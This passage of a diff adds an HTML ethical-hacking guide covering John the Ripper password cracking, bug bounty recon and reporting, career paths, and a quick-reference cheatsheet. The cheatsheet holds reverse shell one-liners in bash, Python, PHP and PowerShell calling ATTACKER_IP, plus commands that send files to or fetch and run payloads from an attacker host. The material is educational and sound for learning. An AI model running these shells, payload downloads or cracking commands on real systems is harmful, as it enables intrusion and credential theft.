+                    <div class="card-title">Hash Identification</div>
+                    <pre><code class="language-bash"># Use hash-identifier
+hash-identifier
+# Paste hash, get possible types
+
+# Or use name-that-hash
+pip install name-that-hash
+nth --text "5f4dcc3b5aa765d61d8327deb882cf99"
+
+# Manual identification by length:
+# 32 chars  → MD5, NTLM, MD4
+# 40 chars  → SHA1, MySQL5
+# 64 chars  → SHA256
+# 128 chars → SHA512</code></pre>
+                </div>
+            </div>
+            
+            <h3>Cracking Modes</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    JOHN THE RIPPER CRACKING MODES                            │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   1. SINGLE CRACK MODE (Default)                                             │
+│      Uses username/GECOS info for cracking                                  │
+│      john --single hashes.txt                                                │
+│                                                                              │
+│   2. WORDLIST MODE (Most Common)                                             │
+│      Uses dictionary file for cracking                                      │
+│      john --wordlist=/path/to/wordlist.txt hashes.txt                       │
+│                                                                              │
+│   3. INCREMENTAL MODE (Brute Force)                                          │
+│      Tries all possible combinations                                        │
+│      john --incremental hashes.txt                                           │
+│      john -i=alpha hashes.txt        # Letters only                         │
+│      john -i=digits hashes.txt       # Numbers only                         │
+│                                                                              │
+│   4. EXTERNAL MODE                                                           │
+│      Custom cracking logic                                                  │
+│      john --external=[mode] hashes.txt                                       │
+│                                                                              │
+│   5. MARKOV MODE                                                             │
+│      Statistical approach for intelligent guessing                          │
+│      john --markov hashes.txt                                                │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘</div>
+            
+            <h3>Cracking Examples</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Linux Shadow File</div>
+                    <pre><code class="language-bash"># Combine passwd and shadow
+unshadow /etc/passwd /etc/shadow > hashes.txt
+
+# Crack with wordlist
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# Show cracked passwords
+john --show hashes.txt
+
+# Specific format
+john --format=sha512crypt --wordlist=rockyou.txt hashes.txt</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Windows Hashes (NTLM)</div>
+                    <pre><code class="language-bash"># From SAM dump or hashdump
+# Format: user:rid:lm_hash:ntlm_hash:::
+
+# Crack NTLM hashes
+john --format=nt --wordlist=rockyou.txt ntlm_hashes.txt
+
+# LM hashes (legacy)
+john --format=lm --wordlist=rockyou.txt lm_hashes.txt
+
+# Show results
+john --show --format=nt ntlm_hashes.txt</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">MD5/SHA Hashes</div>
+                    <pre><code class="language-bash"># MD5 hash
+echo -n "password" | md5sum
+# 5f4dcc3b5aa765d61d8327deb882cf99
+
+# Crack MD5
+john --format=raw-md5 --wordlist=rockyou.txt md5_hashes.txt
+
+# SHA1
+john --format=raw-sha1 --wordlist=rockyou.txt sha1_hashes.txt
+
+# SHA256
+john --format=raw-sha256 --wordlist=rockyou.txt sha256_hashes.txt
+
+# bcrypt
+john --format=bcrypt --wordlist=rockyou.txt bcrypt_hashes.txt</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Archive Passwords</div>
+                    <pre><code class="language-bash"># ZIP file
+zip2john protected.zip > zip_hash.txt
+john --wordlist=rockyou.txt zip_hash.txt
+
+# RAR file
+rar2john protected.rar > rar_hash.txt
+john --wordlist=rockyou.txt rar_hash.txt
+
+# PDF file
+pdf2john protected.pdf > pdf_hash.txt
+john --wordlist=rockyou.txt pdf_hash.txt
+
+# Office documents
+office2john protected.docx > office_hash.txt
+john --wordlist=rockyou.txt office_hash.txt</code></pre>
+                </div>
+            </div>
+            
+            <h3>John Rules & Customization</h3>
+            <pre><code class="language-bash"># Using rules
+john --wordlist=rockyou.txt --rules hashes.txt
+john --wordlist=rockyou.txt --rules=best64 hashes.txt
+john --wordlist=rockyou.txt --rules=OneRuleToRuleThemAll hashes.txt
+
+# Custom rules (add to john.conf)
+[List.Rules:Custom]
+# Add numbers at end
+$[0-9]$[0-9]
+# Capitalize first letter
+c
+# Add common suffixes
+$[!@#$%^&*()]
+
+# Use custom rules
+john --wordlist=rockyou.txt --rules=Custom hashes.txt
+
+# Session management
+john --session=my_session hashes.txt
+john --restore=my_session
+
+# Show status
+john --show hashes.txt
+john --show=formats</code></pre>
+            
+            <h3>Wordlists</h3>
+            <div class="resources-grid">
+                <div class="resource-card">
+                    <div class="name">rockyou.txt</div>
+                    <div class="url">/usr/share/wordlists/rockyou.txt</div>
+                    <div class="desc">14M+ passwords from 2009 breach</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">SecLists</div>
+                    <div class="url">github.com/danielmiessler/SecLists</div>
+                    <div class="desc">Comprehensive security lists</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">CrackStation</div>
+                    <div class="url">crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm</div>
+                    <div class="desc">1.5B password list</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">Weakpass</div>
+                    <div class="url">weakpass.com/wordlist</div>
+                    <div class="desc">Curated wordlists for cracking</div>
+                </div>
+            </div>
+            
+            <h3>John vs Hashcat</h3>
+            <table>
+                <tr>
+                    <th>Feature</th>
+                    <th>John the Ripper</th>
+                    <th>Hashcat</th>
+                </tr>
+                <tr>
+                    <td>GPU Support</td>
+                    <td>Yes (requires build)</td>
+                    <td>Yes (native)</td>
+                </tr>
+                <tr>
+                    <td>CPU Cracking</td>
+                    <td>Excellent</td>
+                    <td>Good</td>
+                </tr>
+                <tr>
+                    <td>Ease of Use</td>
+                    <td>Simple syntax</td>
+                    <td>More complex</td>
+                </tr>
+                <tr>
+                    <td>Hash Formats</td>
+                    <td>Auto-detect</td>
+                    <td>Manual specification</td>
+                </tr>
+                <tr>
+                    <td>Rules</td>
+                    <td>Built-in, extensive</td>
+                    <td>External rules files</td>
+                </tr>
+                <tr>
+                    <td>Best For</td>
+                    <td>CPU cracking, auto-detection</td>
+                    <td>GPU cracking, speed</td>
+                </tr>
+            </table>
+            
+            <div class="tip-box">
+                <div>
+                    <strong>Pro Tip:</strong> Always start with <code>--single</code> mode (fastest), then wordlist mode, then rules, and finally incremental mode (slowest). Use <code>john --show</code> to see already cracked passwords without re-running.
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 8: Bug Bounty -->
+        <section class="section">
+            <h2><span class="icon">💰</span> Bug Bounty Hunting</h2>
+            
+            <div class="tool-header">
+                <div class="tool-name">💰 Bug Bounty</div>
+                <div class="tool-meta">
+                    <span>Responsible Disclosure</span>
+                    <span>Financial Rewards</span>
+                    <span>Career Building</span>
+                </div>
+            </div>
+            
+            <p>Bug bounty programs allow security researchers to find and report vulnerabilities in exchange for monetary rewards. It's an excellent way to build skills, earn money, and establish a cybersecurity career.</p>
+            
+            <h3>Bug Bounty Platforms</h3>
+            <div class="resources-grid">
+                <div class="resource-card">
+                    <div class="name">HackerOne</div>
+                    <div class="url">hackerone.com</div>
+                    <div class="desc">Largest platform, major companies, great for beginners</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">Bugcrowd</div>
+                    <div class="url">bugcrowd.com</div>
+                    <div class="desc">Wide variety of programs, clear scope guidelines</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">Intigriti</div>
+                    <div class="url">intigriti.com</div>
+                    <div class="desc">European platform, quality-focused programs</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">Synack</div>
+                    <div class="url">synack.com</div>
+                    <div class="desc">Private programs, requires vetting</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">YesWeHack</div>
+                    <div class="url">yeswehack.com</div>
+                    <div class="desc">European platform, clear payout structure</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">Open Bug Bounty</div>
+                    <div class="url">openbugbounty.org</div>
+                    <div class="desc">Free program, any website, builds reputation</div>
+                </div>
+            </div>
+            
+            <h3>Getting Started - The Process</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    BUG BOUNTY HUNTING WORKFLOW                               │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   PHASE 1: PREPARATION                                                       │
+│   ├── Create accounts on bug bounty platforms                               │
+│   ├── Read program scope carefully                                          │
+│   ├── Set up testing environment (VM, VPN)                                 │
+│   └── Understand rules of engagement                                        │
+│                                                                              │
+│   PHASE 2: RECONNAISSANCE                                                    │
+│   ├── Subdomain enumeration (subfinder, amass)                             │
+│   ├── Port scanning (nmap, masscan)                                        │
+│   ├── Technology fingerprinting (wappalyzer, whatweb)                      │
+│   ├── Directory enumeration (gobuster, ffuf)                               │
+│   └── JavaScript analysis for endpoints                                     │
+│                                                                              │
+│   PHASE 3: VULNERABILITY DISCOVERY                                           │
+│   ├── Manual testing (Burp Suite)                                          │
+│   ├── Automated scanning (nuclei, nikto)                                   │
+│   ├── Test common vulnerabilities (OWASP Top 10)                           │
+│   └── Look for business logic flaws                                        │
+│                                                                              │
+│   PHASE 4: EXPLOITATION & PROOF OF CONCEPT                                   │
+│   ├── Develop working exploit                                               │
+│   ├── Document reproduction steps                                          │
+│   ├── Capture screenshots/evidence                                         │
+│   └── Assess impact and severity                                           │
+│                                                                              │
+│   PHASE 5: REPORTING                                                         │
+│   ├── Write clear, detailed report                                         │
+│   ├── Include steps to reproduce                                           │
+│   ├── Provide impact assessment                                             │
+│   └── Suggest remediation                                                   │
+│                                                                              │
+│   PHASE 6: FOLLOW-UP                                                         │
+│   ├── Respond to triager questions                                         │
+│   ├── Re-test after fixes                                                   │
+│   └── Build relationships with programs                                    │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘</div>
+            
+            <h3>Valuable Vulnerability Types</h3>
+            <table>
+                <tr>
+                    <th>Vulnerability</th>
+                    <th>Typical Bounty Range</th>
+                    <th>Difficulty</th>
+                </tr>
+                <tr>
+                    <td>Remote Code Execution (RCE)</td>
+                    <td>$5,000 - $100,000+</td>
+                    <td>Hard</td>
+                </tr>
+                <tr>
+                    <td>SQL Injection</td>
+                    <td>$1,000 - $20,000+</td>
+                    <td>Medium</td>
+                </tr>
+                <tr>
+                    <td>Authentication Bypass</td>
+                    <td>$1,000 - $15,000+</td>
+                    <td>Medium</td>
+                </tr>
+                <tr>
+                    <td>Server-Side Request Forgery (SSRF)</td>
+                    <td>$500 - $10,000+</td>
+                    <td>Medium</td>
+                </tr>
+                <tr>
+                    <td>IDOR (Insecure Direct Object Reference)</td>
+                    <td>$100 - $5,000+</td>
+                    <td>Easy</td>
+                </tr>
+                <tr>
+                    <td>Cross-Site Scripting (XSS)</td>
+                    <td>$100 - $5,000+</td>
+                    <td>Easy</td>
+                </tr>
+                <tr>
+                    <td>Cross-Site Request Forgery (CSRF)</td>
+                    <td>$100 - $3,000+</td>
+                    <td>Easy</td>
+                </tr>
+                <tr>
+                    <td>Information Disclosure</td>
+                    <td>$50 - $1,000+</td>
+                    <td>Easy</td>
+                </tr>
+            </table>
+            
+            <h3>Reconnaissance Tools & Techniques</h3>
+            <pre><code class="language-bash"># Subdomain Enumeration
+subfinder -d target.com -o subdomains.txt
+amass enum -passive -d target.com -o amass_subs.txt
+findomain -t target.com -u findomain_subs.txt
+
+# Combine and deduplicate
+cat *.txt | sort -u > all_subdomains.txt
+
+# DNS Resolution
+cat all_subdomains.txt | dnsx -resp -a -cname -o resolved.txt
+
+# Port Scanning (fast)
+cat resolved.txt | naabu -top-ports 1000 -o ports.txt
+
+# Technology Detection
+cat resolved.txt | httpx -tech-detect -status-code -title -o alive.txt
+
+# Directory Enumeration
+cat alive.txt | sed 's/https\?:\/\///' | while read url; do
+    gobuster dir -u "https://$url" -w /usr/share/seclists/Discovery/Web-Content/common.txt -o "gobuster_$url.txt"
+done
+
+# Vulnerability Scanning
+nuclei -l alive.txt -t cves/ -t vulnerabilities/ -o nuclei_results.txt
+
+# JavaScript Analysis
+cat alive.txt | jsluice urls | tee js_endpoints.txt
+python3 LinkFinder.py -i https://target.com -o linkfinder.txt
+
+# Parameter Discovery
+arjun -u "https://target.com/page" -oJ arjun_results.json</code></pre>
+            
+            <h3>Writing a Good Bug Report</h3>
+            <div class="card">
+                <div class="card-title">Report Template</div>
+                <pre><code class="language-markdown"># [Vulnerability Title]
+
+## Summary
+Brief description of the vulnerability and its impact.
+
+## Affected URL/Endpoint
+https://target.com/vulnerable/endpoint
+
+## Steps to Reproduce
+1. Navigate to https://target.com/vulnerable/endpoint
+2. Enter payload: ' OR 1=1--
+3. Observe error message reveals database info
+4. Use SQLMap to extract data
+
+## Proof of Concept
+[Include screenshots, videos, or scripts]
+
+```bash
+sqlmap -u "https://target.com/page?id=1" --dbs
+```
+
+## Impact
+- Attacker can access all database data
+- User credentials can be stolen
+- PII exposure
+
+## Remediation
+- Use parameterized queries
+- Implement input validation
+- Use least privilege database accounts
+
+## Supporting Materials
+- Request/Response screenshots
+- Database dump (sanitized)
+- Screenshots of vulnerable behavior</code></pre>
+            </div>
+            
+            <h3>Common Mistakes to Avoid</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Don't Do This</div>
+                    <ul>
+                        <li>Test outside the defined scope</li>
+                        <li>Access other users' data without permission</li>
+                        <li>Disclose vulnerabilities publicly before fix</li>
+                        <li>Submit low-quality or duplicate reports</li>
+                        <li>Use automated scanners without verifying</li>
+                        <li>Demand payment or threaten disclosure</li>
+                        <li>Test on production without authorization</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Do This Instead</div>
+                    <ul>
+                        <li>Read and follow program rules carefully</li>
+                        <li>Test only within scope boundaries</li>
+                        <li>Create your own test accounts</li>
+                        <li>Report duplicates responsibly</li>
+                        <li>Verify scanner findings manually</li>
+                        <li>Communicate professionally with teams</li>
+                        <li>Wait for responsible disclosure timeline</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="warning-box">
+                <div>
+                    <strong>Legal Note:</strong> Even on bug bounty programs, always stay within scope. Testing out-of-scope assets can result in legal action. When in doubt, ask the program team before testing. Never test systems you don't have explicit permission to test.
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 9: Building Your Career -->
+        <section class="section">
+            <h2><span class="icon">🚀</span> Building Your Ethical Hacking Career</h2>
+            
+            <h3>Essential Certifications</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                  CYBERSECURITY CERTIFICATION PATH                            │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   ENTRY LEVEL                                                                │
+│   ├── CompTIA Security+           $370    Foundational security            │
+│   ├── eJPT (eLearnSecurity)       $200    Practical pentesting             │
+│   └── CEH (EC-Council)            $1,199  Knowledge-based, HR filter       │
+│                                                                              │
+│   INTERMEDIATE                                                               │
+│   ├── OSCP (Offensive Security)   $1,149  Gold standard, hands-on          │
+│   ├── PNPT (TCM Security)         $399    Practical, growing recognition   │
+│   └── eCPPT (eLearnSecurity)      $400    Advanced pentesting              │
+│                                                                              │
+│   ADVANCED                                                                   │
+│   ├── OSWE (Offensive Security)   $1,499  Web application expert           │
+│   ├── OSEE (Offensive Security)   $3,500  Advanced exploitation            │
+│   └── CRTO (Rastalabs)            $445    Red team operations              │
+│                                                                              │
+│   SPECIALIZED                                                                │
+│   ├── eWPT (Web Pentesting)       $400    Web application testing          │
+│   ├── eMAPT (Mobile)              $400    Mobile application testing       │
+│   └── GCFA (Forensics)            $1,999  Digital forensics                │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘</div>
+            
+            <h3>Recommended Learning Path</h3>
+            <div class="flow-diagram">
+                <span class="step">Linux & Networking</span>
+                <span class="arrow">→</span>
+                <span class="step">Security+</span>
+                <span class="arrow">→</span>
+                <span class="step">TryHackMe</span>
+                <span class="arrow">→</span>
+                <span class="step">HackTheBox</span>
+                <span class="arrow">→</span>
+                <span class="step">OSCP</span>
+            </div>
+            
+            <h3>Building Your Portfolio</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">CTF Writeups</div>
+                    <ul>
+                        <li>Solve CTF challenges on HackTheBox, TryHackMe</li>
+                        <li>Write detailed walkthroughs</li>
+                        <li>Publish on blog, Medium, or GitHub</li>
+                        <li>Shows analytical thinking</li>
+                        <li>Helps others learn (community contribution)</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Bug Bounty Profile</div>
+                    <ul>
+                        <li>Build reputation on HackerOne, Bugcrowd</li>
+                        <li>Focus on quality over quantity</li>
+                        <li>Get recognized for good reports</li>
+                        <li>Rank in leaderboards</li>
+                        <li>Private program invitations</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Open Source Contributions</div>
+                    <ul>
+                        <li>Contribute to security tools</li>
+                        <li>Create your own tools/scripts</li>
+                        <li>Write security-related code</li>
+                        <li>Shows technical proficiency</li>
+                        <li>GitHub activity demonstrates passion</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Knowledge Sharing</div>
+                    <ul>
+                        <li>Write blog posts about findings</li>
+                        <li>Create YouTube tutorials</li>
+                        <li>Speak at local meetups</li>
+                        <li>Answer questions on forums</li>
+                        <li>Build personal brand</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <h3>Job Roles & Salary Expectations</h3>
+            <table>
+                <tr>
+                    <th>Role</th>
+                    <th>Experience</th>
+                    <th>Salary Range (US)</th>
+                </tr>
+                <tr>
+                    <td>Security Analyst</td>
+                    <td>0-2 years</td>
+                    <td>$60,000 - $90,000</td>
+                </tr>
+                <tr>
+                    <td>Junior Penetration Tester</td>
+                    <td>1-3 years</td>
+                    <td>$75,000 - $110,000</td>
+                </tr>
+                <tr>
+                    <td>Penetration Tester</td>
+                    <td>3-5 years</td>
+                    <td>$100,000 - $150,000</td>
+                </tr>
+                <tr>
+                    <td>Senior Penetration Tester</td>
+                    <td>5-8 years</td>
+                    <td>$130,000 - $180,000</td>
+                </tr>
+                <tr>
+                    <td>Red Team Operator</td>
+                    <td>5+ years</td>
+                    <td>$140,000 - $200,000+</td>
+                </tr>
+                <tr>
+                    <td>Security Consultant</td>
+                    <td>5+ years</td>
+                    <td>$120,000 - $180,000</td>
+                </tr>
+                <tr>
+                    <td>Bug Bounty Hunter (Full-time)</td>
+                    <td>Varies</td>
+                    <td>Highly variable ($0 - $500,000+)</td>
+                </tr>
+            </table>
+            
+            <h3>Networking & Community</h3>
+            <div class="resources-grid">
+                <div class="resource-card">
+                    <div class="name">Twitter/X Security Community</div>
+                    <div class="desc">Follow researchers, stay updated on latest vulns</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">Discord Servers</div>
+                    <div class="desc">TryHackMe, HackTheBox, InfoSec communities</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">Local Meetups</div>
+                    <div class="desc">OWASP chapters, BSides, DefCon groups</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">Conferences</div>
+                    <div class="desc">DefCon, Black Hat, BSides, OWASP Global</div>
+                </div>
+            </div>
+            
+            <div class="career-path">
+                <h4>📋 Daily Learning Checklist</h4>
+                <ul>
+                    <li><span class="step-number">1</span>Read security news (The Hacker News, Krebs on Security, PortSwigger Blog)</li>
+                    <li><span class="step-number">2</span>Spend 1-2 hours on hands-on practice (TryHackMe, HackTheBox)</li>
+                    <li><span class="step-number">3</span>Document what you learned (notes, blog drafts)</li>
+                    <li><span class="step-number">4</span>Engage with the community (Twitter, Discord, forums)</li>
+                    <li><span class="step-number">5</span>Work on one certification path consistently</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- Section 10: Quick Reference -->
+        <section class="section">
+            <h2><span class="icon">📖</span> Quick Reference Cheatsheet</h2>
+            
+            <h3>Reverse Shell One-Liners</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Bash</div>
+                    <pre><code class="language-bash">bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</code></pre>
+                </div>
+                <div class="card">
+                    <div class="card-title">Python</div>
+                    <pre><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre>
+                </div>
+                <div class="card">
+                    <div class="card-title">PHP</div>
+                    <pre><code class="language-php">php -r '$sock=fsockopen("IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</code></pre>
+                </div>
+                <div class="card">
+                    <div class="card-title">PowerShell</div>
+                    <pre><code class="language-powershell">powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String );$s.Write([text.encoding]::UTF8.GetBytes($r),0,$r.Length)};$c.Close()"</code></pre>
+                </div>
+            </div>
+            
+            <h3>File Transfer Methods</h3>
+            <pre><code class="language-bash"># Python HTTP Server (attacker)
+python3 -m http.server 8080
+
+# Download files (victim)
+wget http://attacker_ip:8080/file
+curl http://attacker_ip:8080/file -o file
+
+# Netcat transfer
+# Receiver
+nc -lvnp 4444 > received_file
+# Sender
+nc -w 3 attacker_ip 4444 < file_to_send
+
+# SCP (if SSH access)
+scp file.txt user@target:/path/to/destination
+
+# Base64 encoding (when binary transfer fails)
+# Encode
+base64 file > encoded
+# Decode
+base64 -d encoded > file
+
+# PowerShell Download
+IEX(New-Object Net.WebClient).downloadString('http://attacker_ip/payload.ps1')</code></pre>
+            
+            <h3>Privilege Escalation Quick Checks</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Linux</div>
+                    <pre><code class="language-bash"># Quick enumeration
+id
+sudo -l
+cat /etc/passwd
+find / -perm -4000 2>/dev/null
+cat /etc/crontab
+
+# Kernel exploits check
+uname -a
+searchsploit kernel_version
+
+# Automated tools
+linpeas.sh
+linux-exploit-suggester.sh</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Windows</div>
+                    <pre><code class="language-powershell"># Quick enumeration
+whoami /all
+systeminfo
+net users
+net localgroup administrators
+
+# Service enumeration
+wmic service list brief
+sc query
+
+# Automated tools
+winpeas.exe
+PowerUp.ps1
+PrivescCheck.ps1</code></pre>
+                </div>
+            </div>
+            
+            <h3>Port Reference</h3>
+            <table>
+                <tr>
+                    <th>Port</th>
+                    <th>Service</th>
+                    <th>Common Vulnerabilities</th>
+                </tr>
+                <tr><td>21</td><td>FTP</td><td>Anonymous login, Brute force</td></tr>
+                <tr><td>22</td><td>SSH</td><td>Brute force, Key theft</td></tr>
+                <tr><td>23</td><td>Telnet</td><td>Cleartext credentials</td></tr>
+                <tr><td>25</td><td>SMTP</td><td>Open relay, User enumeration</td></tr>
+                <tr><td>53</td><td>DNS</td><td>Zone transfer, DNS cache poisoning</td></tr>
+                <tr><td>80/443</td><td>HTTP/HTTPS</td><td>Web vulnerabilities (OWASP Top 10)</td></tr>
+                <tr><td>110/995</td><td>POP3</td><td>Cleartext credentials</td></tr>
+                <tr><td>139/445</td><td>SMB</td><td>MS17-010, Null sessions</td></tr>
+                <tr><td>143/993</td><td>IMAP</td><td>Cleartext credentials</td></tr>
+                <tr><td>161/162</td><td>SNMP</td><td>Community strings, Information disclosure</td></tr>
+                <tr><td>389/636</td><td>LDAP</td><td>Null bind, Information disclosure</td></tr>
+                <tr><td>1433</td><td>MSSQL</td><td>Default sa account, SQL injection</td></tr>
+                <tr><td>1521</td><td>Oracle</td><td>Default accounts, TNS poisoning</td></tr>
+                <tr><td>3306</td><td>MySQL</td><td>Root access, Weak passwords</td></tr>
+                <tr><td>3389</td><td>RDP</td><td>BlueKeep, Brute force</td></tr>
+                <tr><td>5432</td><td>PostgreSQL</td><td>Default accounts, Weak passwords</td></tr>
+                <tr><td>5900</td><td>VNC</td><td>Weak passwords, Brute force</td></tr>
+                <tr><td>8080</td><td>HTTP Proxy</td><td>Proxy abuse, Web vulns</td></tr>
+            </table>
+        </section>
+
+        <footer>
+            <p>🔓 Ethical Hacking Mastery Guide</p>
+            <p>Remember: Always obtain proper authorization before testing any systems</p>
+            <p>Practice responsibly on legal platforms • Build your skills ethically • Protect and defend</p>
+        </footer>
+    </div>
+    
+    <script>
+        // Smooth scroll
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                e.preventDefault();
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+            });
+        });
+        
+        // Animation on scroll
+        const sections = document.querySelectorAll('.section');
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.opacity = '1';
+                    entry.target.style.transform = 'translateY(0)';
+                }
+            });
+        }, { threshold: 0.1 });
+        
+        sections.forEach(section => {
+            section.style.opacity = '0';
+            section.style.transform = 'translateY(20px)';
+            section.style.transition = 'all 0.5s ease-out';
+            observer.observe(section);
+        });
+        
+        // Copy code on click
+        document.querySelectorAll('pre').forEach(block => {
+            block.addEventListener('click', () => {
+                const code = block.textContent;
+                navigator.clipboard.writeText(code).then(() => {
+                    const notification = document.createElement('div');
+                    notification.textContent = '✓ Copied to clipboard!';
+                    notification.style.cssText = `
+                        position: fixed;
+                        bottom: 20px;
+                        right: 20px;
+                        background: #00ff00;
+                        color: #000;
+                        padding: 12px 24px;
+                        border-radius: 8px;
+                        font-family: 'JetBrains Mono', monospace;
+                        font-weight: 600;
+                        z-index: 1000;
+                        box-shadow: 0 4px 20px rgba(0, 255, 0, 0.3);
+                    `;
+                    document.body.appendChild(notification);
+                    setTimeout(() => notification.remove(), 2000);
+                });
+            });
+            block.style.cursor = 'pointer';
+            block.title = 'Click to copy';
+        });
+    </script>
+</body>
+</html>
